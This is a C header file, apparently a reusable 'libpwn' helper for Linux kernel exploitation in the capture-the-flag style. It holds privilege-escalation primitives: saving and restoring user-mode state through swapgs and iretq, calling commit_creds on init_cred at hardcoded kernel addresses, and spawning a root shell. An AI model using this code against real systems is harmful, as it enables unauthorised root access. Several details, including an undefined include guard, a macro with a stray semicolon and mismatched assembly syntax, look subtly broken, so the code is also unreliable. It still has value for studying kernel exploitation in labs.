// inspired by the goat: https://github.com/n132/libx/blob/main/libx.c
#define _GNU_SOURCE
#ifndef LIBPWN_H
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>
#include <errno.h>
#include <stddef.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <assert.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <netinet/tcp.h>
#include <sys/prctl.h>
#include <poll.h>
#include <sys/shm.h>

size_t kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((size_t)(addr)-0xffffffff81000000 + kernel_base);

typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

size_t commit_creds, prepare_kernel_cred;
size_t swapgs_restore_regs_and_return_to_usermode, pop_rdi_ret;
size_t user_cs, user_ss, user_rflags, user_sp, user_rsp;

void save_state() {
    asm volatile (
        "movq %0, cs\n"
        "movq %1, ss\n"
        "movq %2, rsp\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        : 
        : "memory"
    );
}

void win() {
    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

void restore_state() {
    asm volatile(
        "swapgs\n"
        "movq [rsp + 0x00], %0\n"
        "movq [rsp + 0x08], %1\n"
        "movq [rsp + 0x10], %2\n"
        "movq [rsp + 0x18], %3\n"
        "movq [rsp + 0x20], %4\n"
        "iretq\n"
        :
        : "r"(win), "r"(user_cs), "r"(user_rflags), "r"(user_rsp), "r"(user_ss)
    );
}

#define addr_init_cred      0xffffffff81e3bfa0
#define addr_commit_creds   0xffffffff812a1050

void escalate_privilege() {
    void (*commit_creds) (void *) = (void *)addr_commit_creds;
    commit_creds((void *)addr_init_cred);
    restore_state();
}  

void dump_hex(char *buf, size_t size){
 for(int i = 0; i < size/8; i++){
        printf("[+] %d - 0x%016lx\n", i, ((unsigned long *)buf)[i]);
  }
}

void ppause(){
    puts("enter to unpause");
    getchar();
}

void info(const char *msg, unsigned long val){
    printf("[INFO] %s: %p\n", msg, val);
}

void error(const char *msg){
    printf("[ERROR] %s\n", msg);
    exit(-1);
}


#endif /* LIBPWN_H */
